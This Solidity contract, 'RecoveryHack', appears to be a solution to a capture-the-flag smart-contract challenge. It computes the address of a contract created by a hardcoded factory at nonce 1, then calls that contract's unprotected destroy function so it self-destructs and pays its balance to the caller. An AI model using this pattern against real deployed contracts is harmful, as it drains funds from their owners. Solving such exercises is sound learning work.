// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract RecoveryHack {

  address token;
  address factory = 0x356Ca2cBE6c36C0Eed9E20e5f34D01f055a90980;
  constructor() public {
      token = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(factory), bytes1(0x01))))));
      (bool s, ) = token.call(abi.encodeWithSignature("destroy(address)",msg.sender));
      require(s, "failed to destroy.");
  }
}
